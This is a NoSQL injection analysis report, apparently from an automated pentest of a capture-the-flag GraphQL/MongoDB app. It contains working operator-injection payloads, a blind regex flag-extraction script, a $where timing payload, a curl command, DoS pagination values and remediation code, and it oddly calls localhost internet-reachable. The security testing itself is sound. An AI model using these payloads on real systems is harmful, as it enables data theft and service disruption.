# Injection Analysis Report (SQLi & Command Injection)

## 1. Executive Summary

- **Analysis Status:** Complete  
- **Key Outcome:** One critical NoSQL injection vulnerability was identified and confirmed exploitable via external network access at http://localhost:5003. The vulnerability allows complete database enumeration and direct flag extraction. Additionally, one high-severity resource exhaustion vulnerability was identified in pagination controls. All findings have been passed to the exploitation phase via the machine-readable queue at `deliverables/injection_exploitation_queue.json`.  
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the vulnerabilities listed in the queue. It is intended to be read alongside the JSON deliverable.

## 2. Dominant Vulnerability Patterns

### Pattern #1: Unchecked JSON Deserialization to MongoDB Operators
- **Description:** The application accepts user-provided JSON strings in GraphQL query parameters, deserializes them with `json.loads()`, and directly unpacks the resulting dictionary into MongoEngine ORM filter methods using the `**kwargs` unpacking operator. This pattern allows attackers to inject MongoDB query operators (e.g., `$ne`, `$regex`, `$where`) because there is no validation of dictionary keys or prohibition of the `$` prefix that designates MongoDB operators.
- **Code Pattern:**
  ```python
  # schema.py:13-14
  search_criteria = json.loads(search)  # User-controlled JSON → Python dict
  query = query.filter(**search_criteria)  # Dict unpacked into MongoDB query
  ```
- **Implication:** This is the most dangerous NoSQL injection pattern. Unlike SQL injection which relies on string concatenation, this pattern exploits the semantic structure of NoSQL query languages where operators are represented as dictionary keys. The `**kwargs` unpacking is functionally equivalent to SQL string concatenation in terms of security impact—it allows attacker-controlled data to influence query structure rather than just query values.
- **Representative Vulnerability:** INJ-VULN-01 (GraphQL search parameter)

### Pattern #2: Missing Bounds Validation on Numeric Query Parameters
- **Description:** The application accepts numeric pagination parameters (skip, limit) from user input via JSON deserialization but performs zero validation on their type, sign, or magnitude before passing them to MongoDB operations. While this does not allow modification of query logic (i.e., it's not a true injection vulnerability), it enables resource exhaustion attacks and pagination bypass.
- **Code Pattern:**
  ```python
  # schema.py:21-25
  options_criteria = json.loads(options)  # No schema validation
  if 'skip' in options_criteria:
      query = query.skip(options_criteria['skip'])  # No bounds check
  if 'limit' in options_criteria:
      query = query.limit(options_criteria['limit'])  # No max limit
  ```
- **Implication:** Attackers can specify arbitrarily large skip values (causing MongoDB to scan and discard millions of documents, exhausting CPU) or arbitrarily large limit values (causing memory exhaustion and network saturation). This is a resource consumption issue, not a structural injection, but it's severe enough to cause complete denial of service with a single HTTP request.
- **Representative Vulnerability:** Not included in exploitation queue (DoS only, not data exfiltration)

## 3. Strategic Intelligence for Exploitation

### Database Technology Confirmed
- **Database:** MongoDB (latest version, running in Docker container `mongo:latest`)
- **ORM:** MongoEngine 0.28.2 with PyMongo 4.7.3 backend
- **Connection:** `mongodb://mongo:27017/appdb` (plaintext, no authentication, internal Docker network)
- **Implication:** All exploitation payloads should use MongoDB-specific operators. MongoDB does not support SQL syntax or SQL-based injection techniques.

### No Defensive Evasion Required (No WAF)
- **Finding:** Zero Web Application Firewall or input filtering detected during reconnaissance
- **Validation Present:** Only JSON syntax validation via `json.loads()` - malicious but syntactically valid JSON passes through unchecked
- **Error Handling:** GraphQL errors are exposed to clients (`/app/app.py:30-31`), but for the search parameter injection, errors are silently suppressed (`except json.JSONDecodeError: pass`)
- **Recommendation:** Direct exploitation is possible without encoding, obfuscation, or filter bypass techniques. Use plaintext MongoDB operators in JSON payloads.

### Debug Mode Enabled (Information Leakage)
- **Configuration:** Flask application runs with `debug=True` (`/app/app.py:53`)
- **Impact:** Werkzeug interactive debugger exposes full stack traces, source code snippets, file paths, and local variable values on unhandled exceptions
- **Exploitation Aid:** If type errors are triggered (e.g., by sending non-dict values to filter operations), the error response will leak internal application structure
- **Recommendation:** While the primary vulnerability does not require triggering errors, this debug mode can assist in confirming injection success or understanding unexpected behavior

### GraphiQL Interface Publicly Accessible
- **Endpoint:** `http://localhost:5003/graphql` with `graphiql=True` enabled
- **Feature:** Interactive GraphQL IDE with schema introspection, query building, and auto-completion
- **Exploitation Value:** 
  - Schema introspection reveals all available fields including the `flag` field
  - Query history and syntax highlighting aid payload development
  - Direct browser-based exploitation without needing curl or Burp Suite
- **Recommendation:** Use GraphiQL for rapid payload testing and refinement before automating extraction

### Target Data Structure
- **Collection:** `user` in MongoDB database `appdb`
- **Schema:**
  ```python
  class User(Document):
      username = StringField(required=True)
      email = StringField(required=True)
      is_admin = BooleanField(default=False)
      flag = StringField()  # Target field for CTF flag extraction
  ```
- **Data Distribution:** 5 users total
  - 2 admin users: `admin` (no flag), `admin2` (contains CTF flag)
  - 3 regular users: `user1`, `user2`, `user3` (no flags)
- **Flag Location:** Only the `admin2` user document contains the flag value (initialized from `FLAG` environment variable)
- **Implication:** Direct flag extraction is possible by querying users with `{"flag": {"$ne": null}}` or `{"username": "admin2"}"`

### No Authentication Required
- **Finding:** Zero authentication mechanisms implemented (see Recon deliverable Section 3)
- **Impact:** All exploitation can be performed anonymously from the public internet
- **Scope:** Vulnerability is externally exploitable per mission requirements

## 4. Vectors Analyzed and Confirmed Secure

**FINDING: ZERO SECURE INJECTION VECTORS IDENTIFIED**

This application has no parameterized queries, no input validation, and no defense-in-depth mechanisms for injection prevention. The following table documents what SHOULD have been secure but is not:

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism SHOULD BE Implemented** | **Actual Defense** | **Verdict** |
|----------------------------|---------------------------|--------------------------------------------|--------------------|-------------|
| `search` (GraphQL param) | `/graphql`, `/api/users` schema.py:13-14 | Whitelist of allowed field names, blacklist of `$` operators, type validation | JSON syntax check only | **VULNERABLE** (INJ-VULN-01) |
| `options` (GraphQL param) | `/graphql`, `/api/users` schema.py:21-25 | Bounds checking (skip ≥ 0, limit ≤ 100), type validation (must be int) | None - any JSON value accepted | **VULNERABLE** (DoS, not in exploitation queue) |
| `dummy` (GraphQL param) | `/graphql`, `/api/users` schema.py:8 | N/A (unused parameter, dead code) | None | **SAFE** (never processed) |
| `is_admin` (GraphQL param) | `/graphql`, `/api/users` schema.py:8 | Should be used for authorization checks, not as user input | Accepted as user input but not enforced | **UNSAFE** (authorization issue, not injection) |

**Note:** The `dummy` parameter is the only "secure" input vector, and it's secure solely because it's dead code that never reaches a sink. There are no examples of PROPERLY DEFENDED injection vectors in this codebase.

**Command Injection Analysis:**
- **Finding:** Application is architecturally immune to command injection
- **Reason:** Zero use of `subprocess`, `os.system()`, `eval()`, or any external command execution
- **Conclusion:** No command injection attack surface exists

## 5. Analysis Constraints and Blind Spots

### Constraint #1: MongoDB Internal Behavior
- **Description:** Static analysis cannot fully determine how MongoDB handles edge cases for certain operators, especially version-specific behaviors
- **Examples:**
  - Whether `$where` operator is enabled (depends on MongoDB configuration and version)
  - Exact behavior of negative skip values (documentation says treated as 0, but behavior may vary)
  - JavaScript execution security in `$where` and `$function` operators (deprecated in newer versions)
- **Impact on Analysis:** 
  - Marked `$where` operator as "potential JavaScript execution" in findings
  - Cannot confirm if blind injection timing attacks via `$where` are viable without live testing
- **Mitigation:** Exploitation phase should test multiple operator variants to determine which are available

### Constraint #2: Silent Exception Handling
- **Location:** `/app/schema.py:15-16` and `/app/schema.py:26-27`
- **Code:**
  ```python
  except json.JSONDecodeError:
      pass  # Silent failure - no logging
  ```
- **Impact:** If JSON is malformed, the search/options filters are silently ignored and the query proceeds unmodified
- **Blind Spot:** Cannot determine through static analysis whether there are other exception types that might be silently caught by framework-level handlers
- **Implication:** Exploitation payloads must use valid JSON syntax to ensure they reach the vulnerable sink

### Constraint #3: MongoEngine ORM Abstraction Layer
- **Description:** MongoEngine sits between application code and PyMongo/MongoDB, performing transformations that are not visible in application source
- **Examples:**
  - Type coercion (e.g., string "100" might be auto-converted to integer 100)
  - Operator validation (MongoEngine might reject certain operators before they reach MongoDB)
  - Query optimization or rewriting
- **Impact on Analysis:**
  - Cannot definitively confirm ALL MongoDB operators are accessible without testing
  - Documented common operators (`$ne`, `$regex`, `$gt`, `$lt`, `$in`, `$exists`) as confirmed, marked advanced operators (`$where`, `$expr`) as potential
- **Mitigation:** Exploitation phase should test operator availability rather than assuming all operators work

### Constraint #4: Network-Level Defenses
- **Scope:** Analysis focused on application-level code only
- **Blind Spots:**
  - Reverse proxy or load balancer in front of Flask application (not visible in codebase)
  - Network-level rate limiting or IDS/IPS
  - Container orchestration security policies
- **Assumption:** Based on recon report findings (no WAF, debug mode exposed, direct port 5003 access), assuming no network-level defenses
- **Recommendation:** Exploitation phase should verify direct network access before claiming external exploitability

### Constraint #5: Unexamined Code Paths
- **Finding:** The `dummy` parameter is defined in the schema but never used
- **Code:** `/app/schema.py:8` - `dummy=None` parameter declared but never referenced in resolver body
- **Blind Spot:** Cannot rule out future code changes or conditional logic that might activate this parameter
- **Impact:** Low - marked as dead code, but exploitation phase should avoid relying on its absence

### No Blind Spots in Core Vulnerability
- **Confidence:** HIGH for INJ-VULN-01 (search parameter injection)
- **Reason:** Data flow path is complete and unambiguous:
  1. User input → GraphQL query string
  2. JSON deserialization → Python dict
  3. Dict unpacking → MongoEngine filter
  4. MongoDB query execution
- **Validation:** Zero sanitization or transformation steps that could prevent exploitation
- **Conclusion:** This vulnerability is confirmed exploitable through static analysis alone

## 6. Detailed Vulnerability Analysis

### Vulnerability INJ-VULN-01: NoSQL Operator Injection via GraphQL Search Parameter

#### Data Flow Trace
1. **Source:** HTTP POST to `http://localhost:5003/api/users` or `http://localhost:5003/graphql`
   - Parameter: `search` (GraphQL String argument)
   - Transport: JSON POST body containing GraphQL query
2. **Hop 1:** Flask route handler (`/app/app.py:26`) extracts `query` from `request.json`
3. **Hop 2:** GraphQL execution engine (`/app/app.py:27`) parses query and invokes resolver
4. **Hop 3:** Resolver function (`/app/schema.py:8`) receives `search` parameter as Python string
5. **Hop 4:** JSON deserialization (`/app/schema.py:13`): `search_criteria = json.loads(search)`
6. **Hop 5:** Dictionary unpacking to MongoEngine filter (`/app/schema.py:14`): `query.filter(**search_criteria)`
7. **Sink:** MongoEngine QuerySet constructs MongoDB `find()` query with attacker-controlled operators

#### Sanitization Observed
- **Location:** `/app/schema.py:13`
- **Function:** `json.loads(search)`
- **Type:** JSON syntax validation only
- **Effectiveness:** INSUFFICIENT - validates structure but not content
- **Bypass:** Any syntactically valid JSON passes through, including:
  - MongoDB operators: `{"username": {"$ne": null}}`
  - Regex patterns: `{"flag": {"$regex": "^flag{"}}`
  - Logical operators: `{"$or": [{"is_admin": true}, {"flag": {"$exists": true}}]}`

#### Concatenation Occurrences
- **Finding:** No string concatenations observed
- **Reason:** This is NOT a string-based injection; it's an operator injection via dictionary unpacking
- **Equivalent Operation:** The `**search_criteria` unpacking is functionally equivalent to SQL string concatenation in terms of security impact—it allows attacker control over query structure

#### Sink Context
- **Slot Type:** Query Operator Slot (most dangerous NoSQL injection type)
- **Method:** `MongoEngine QuerySet.filter(**kwargs)`
- **Location:** `/app/schema.py:14`
- **Database Operation:** MongoDB `find()` with attacker-controlled query document
- **Controllable Elements:**
  1. Field names (dictionary keys at depth 1)
  2. MongoDB operators (dictionary keys at depth 2 starting with `$`)
  3. Comparison values (dictionary values)

#### Accessible MongoDB Operators
**Confirmed Available:**
- `$ne` - Not equal (authentication bypass, filter negation)
- `$gt`, `$gte`, `$lt`, `$lte` - Comparison operators (range queries)
- `$in`, `$nin` - Array membership (multi-value matching)
- `$exists` - Field existence check (schema discovery)
- `$regex` - Regular expression matching (blind character-by-character extraction)
- `$or`, `$and`, `$nor` - Logical operators (complex query construction)

**Potentially Available (requires testing):**
- `$where` - JavaScript expression evaluation (potential RCE, often disabled in modern MongoDB)
- `$expr` - Aggregation expression (advanced query logic)
- `$jsonSchema` - Schema validation (information disclosure)

#### Mismatch Analysis
- **Expected Defense:** Whitelist of allowed field names (`username`, `email`) and blacklist of `$` prefix to prevent operator injection
- **Actual Defense:** None - all dictionary keys accepted
- **Context Mismatch:** User input is treated as trusted query structure instead of untrusted data values
- **Root Cause:** Confusion between "data value" slot (should be parameterized) and "query operator" slot (should be application-controlled only)

#### Witness Payloads

**Payload #1: Direct Flag Extraction**
```graphql
query {
  users(search: "{\"flag\": {\"$ne\": null}}") {
    username
    email
    flag
  }
}
```
**Effect:** Returns all users where `flag` field exists and is non-null (i.e., admin2 user with CTF flag)

**Payload #2: Admin User Enumeration**
```graphql
query {
  users(search: "{\"is_admin\": true}") {
    username
    email
    flag
  }
}
```
**Effect:** Returns all admin users (admin and admin2), exposing the flag in admin2's record

**Payload #3: Regex-Based Blind Extraction**
```graphql
query {
  users(search: "{\"flag\": {\"$regex\": \"^flag{a\"}}") {
    username
  }
}
```
**Effect:** Boolean-based blind injection - if result is non-empty, flag starts with "flag{a"

**Payload #4: Logical Operator Chaining**
```graphql
query {
  users(search: "{\"$or\": [{\"username\": \"admin2\"}, {\"flag\": {\"$exists\": true}}]}") {
    username
    flag
  }
}
```
**Effect:** Returns users matching either condition (demonstrates complex query construction capability)

#### Confidence Assessment
- **Confidence:** HIGH
- **Justification:**
  - Complete source-to-sink data flow traced
  - Zero sanitization or validation observed
  - Sink context clearly identified (operator slot)
  - Mismatch is unambiguous (no operator filtering)
  - No post-sanitization concatenation to consider
  - Witness payloads are straightforward and require no encoding/bypass
- **Reproducibility:** Trivial - single HTTP request with JSON payload

#### External Exploitability
- **Verdict:** YES - Externally Exploitable
- **Access Required:** HTTP client capable of sending POST requests to `http://localhost:5003`
- **Authentication Required:** None (application has zero authentication)
- **Network Access:** Public internet access to port 5003 sufficient
- **Special Requirements:** None (no VPN, no internal network access, no credentials)
- **Confirmation:** Meets mission requirement for "exploitable via http://localhost:5003 from the internet"

## 7. MongoDB-Specific Exploitation Techniques

### Technique #1: Direct Operator Injection
- **Description:** Inject MongoDB query operators directly into the `search` parameter to modify query logic
- **Applicable Operators:** `$ne`, `$gt`, `$lt`, `$in`, `$regex`, `$exists`
- **Example:** `{"username": {"$ne": null}}` returns all users where username exists (effectively bypasses any username filter)
- **Advantage:** Requires only basic MongoDB knowledge
- **Limitation:** Direct data extraction (flag visible in response)

### Technique #2: Blind Boolean-Based Injection
- **Description:** Use operators that return different result sets based on condition truth, leaking data one bit at a time
- **Applicable Operators:** `$regex` with character-by-character pattern matching
- **Example:**
  ```
  {"flag": {"$regex": "^flag{a"}}  → Non-empty result if flag starts with "flag{a"
  {"flag": {"$regex": "^flag{b"}}  → Empty result if flag doesn't start with "flag{b"
  ```
- **Advantage:** Works even if flag field is not directly selectable in GraphQL schema
- **Process:** Binary search or character-by-character extraction
- **Script:**
  ```python
  flag = "flag{"
  charset = "abcdefghijklmnopqrstuvwxyz0123456789-_}"
  while not flag.endswith("}"):
      for char in charset:
          payload = {"flag": {"$regex": f"^{flag}{char}"}}
          if query_returns_results(payload):
              flag += char
              break
  ```

### Technique #3: Field Existence Enumeration
- **Description:** Use `$exists` operator to determine which fields are present in documents without seeing values
- **Applicable Operator:** `$exists`
- **Example:** `{"flag": {"$exists": true}}` returns only users with a flag field (admin2)
- **Advantage:** Can discover schema structure and identify high-value targets
- **Use Case:** In scenarios where direct field selection is restricted but search filters are not

### Technique #4: Logical Operator Chaining
- **Description:** Combine multiple conditions using `$or`, `$and`, `$nor` to construct complex queries
- **Applicable Operators:** `$or`, `$and`, `$nor`, `$not`
- **Example:** `{"$or": [{"is_admin": true}, {"username": "admin2"}]}` returns admins OR admin2 user
- **Advantage:** Flexible query construction, can work around restrictive GraphQL schema
- **Use Case:** When multiple paths to target data exist

### Technique #5: Timing-Based Blind Injection (If $where Available)
- **Description:** Use `$where` operator with JavaScript sleep functions to leak data via response timing
- **Applicable Operator:** `$where` (if MongoDB JavaScript execution is enabled)
- **Example:** `{"$where": "this.flag.startsWith('flag{a') && sleep(5000) || true"}`
- **Limitation:** `$where` is deprecated and often disabled in modern MongoDB for security/performance
- **Status:** Requires testing to confirm availability - not guaranteed in this environment

## 8. GraphQL-Specific Considerations

### GraphQL String Escaping
- **Issue:** GraphQL requires double-quote escaping inside string arguments
- **Example:**
  - Direct JSON: `{"username": "admin"}`
  - In GraphQL query: `search: "{\"username\": \"admin\"}"`
  - In HTTP POST body (escaped again for JSON): `"search: \"{\\\"username\\\": \\\"admin\\\"}\""`
- **Solution:** Use triple-level escaping when crafting curl commands:
  ```bash
  curl -d '{"query": "{ users(search: \"{\\\"flag\\\": {\\\"$ne\\\": null}}\") { flag } }"}'
  ```

### GraphQL Field Selection
- **Feature:** GraphQL requires explicit field selection in query
- **Impact:** Attacker must know field names to extract data
- **Mitigation:** GraphiQL schema introspection reveals all fields including `flag`
- **Example:** Must request `{ users(...) { flag } }` to see flag in response, cannot use `SELECT *` equivalent

### GraphiQL Exploitation Workflow
1. Open `http://localhost:5003/graphql` in browser
2. Use "Docs" panel to explore schema and discover `flag` field
3. Build query in editor with syntax highlighting
4. Test injection payloads interactively
5. Refine payload based on error messages or result structure
6. Export working payload to curl/script for automation

## 9. Comparison: True Injection vs Resource Abuse

### The Options Parameter: Why It's Not in the Exploitation Queue

**Finding:** The `options` parameter (`skip` and `limit`) was analyzed and found to be vulnerable to resource exhaustion attacks but NOT to NoSQL injection.

**Key Distinction:**

| Aspect | Search Parameter (INJ-VULN-01) | Options Parameter (Excluded) |
|--------|--------------------------------|-------------------------------|
| **Vulnerability Type** | NoSQL Operator Injection (CWE-943) | Uncontrolled Resource Consumption (CWE-400) |
| **Query Structure Modification** | YES - can inject `$ne`, `$regex`, etc. | NO - only controls offset/page size |
| **Data Exfiltration** | YES - can access unauthorized data (flag) | NO - can only control pagination |
| **Authorization Bypass** | YES - can bypass filters to access admin data | NO - cannot modify query filters |
| **Attack Complexity** | LOW (craft operator JSON) | VERY LOW (use large numbers) |
| **Primary Impact** | Confidentiality (flag extraction) | Availability (DoS) |
| **External Exploitability** | YES (data exfiltration) | YES (but DoS only) |

**Why Excluded from Exploitation Queue:**
- The exploitation queue is for vulnerabilities that enable **data exfiltration** or **command execution**
- The options parameter can only cause **denial of service** (e.g., `{"skip": 999999999}` exhausts MongoDB CPU)
- While severe in production, this is not an injection vulnerability—it's a resource abuse issue
- DoS findings belong in a separate availability/resilience assessment, not injection analysis

**Technical Reason:**
```python
# Options parameter - numeric slot, not operator slot
query = query.skip(999999)  # Large number → DoS, but query logic unchanged
query = query.limit(999999)  # Large number → Memory exhaustion, not injection

# Search parameter - operator slot, TRUE injection
query = query.filter(**{"flag": {"$ne": null}})  # Attacker controls query operators
```

**Mission Alignment:** Per the objective, we focus on "untrusted input insecurely influencing the **structure of a backend command**." The options parameter influences execution parameters but not command structure.

## 10. Remediation Guidance (For Context Only)

**Note:** Remediation is not the focus of this analysis phase, but understanding proper defenses helps confirm the vulnerability.

### Immediate Fix for INJ-VULN-01
```python
# schema.py - Add before line 14
ALLOWED_FIELDS = {'username', 'email', 'is_admin'}  # Whitelist

if search:
    try:
        search_criteria = json.loads(search)
        
        # Validate no MongoDB operators ($ prefix)
        for key in search_criteria.keys():
            if key.startswith('$'):
                raise ValueError(f"Operator not allowed: {key}")
            if key not in ALLOWED_FIELDS:
                raise ValueError(f"Invalid field: {key}")
            
            # Prevent nested operators (e.g., {"username": {"$ne": null}})
            if isinstance(search_criteria[key], dict):
                raise ValueError(f"Complex queries not allowed")
        
        query = query.filter(**search_criteria)
    except (json.JSONDecodeError, ValueError):
        return []  # Return empty on invalid input
```

### Defense-in-Depth Recommendations
1. **Replace arbitrary search with specific parameters** (e.g., `usernameSearch`, `emailSearch`)
2. **Remove GraphiQL from production** (`graphiql=False`)
3. **Disable MongoDB `$where` operator** at database configuration level
4. **Implement authentication and authorization** (currently absent)
5. **Add rate limiting** to prevent automated extraction attempts

## 11. Conclusion

This injection analysis identified **one critical, externally exploitable NoSQL injection vulnerability** in the GraphQL search parameter. The vulnerability is trivially exploitable with zero authentication and enables direct CTF flag extraction.

**Key Takeaway for Exploitation Phase:**
- Focus on INJ-VULN-01 (search parameter injection)
- Use direct operator injection techniques (`$ne`, `$exists`, `$regex`)
- GraphiQL interface provides ideal testing environment
- No filter evasion or encoding required
- Single HTTP request sufficient for flag extraction

**Analysis Coverage:**
- ✅ All injection sources from recon report analyzed
- ✅ Complete data flow traces documented
- ✅ Sanitization mechanisms evaluated (none found effective)
- ✅ Sink contexts identified and classified
- ✅ Witness payloads provided for exploitation phase
- ✅ External exploitability confirmed

**Handoff to Exploitation Phase:**
The machine-readable exploitation queue (`deliverables/injection_exploitation_queue.json`) contains actionable vulnerability details including precise file:line references, payload examples, and confidence ratings.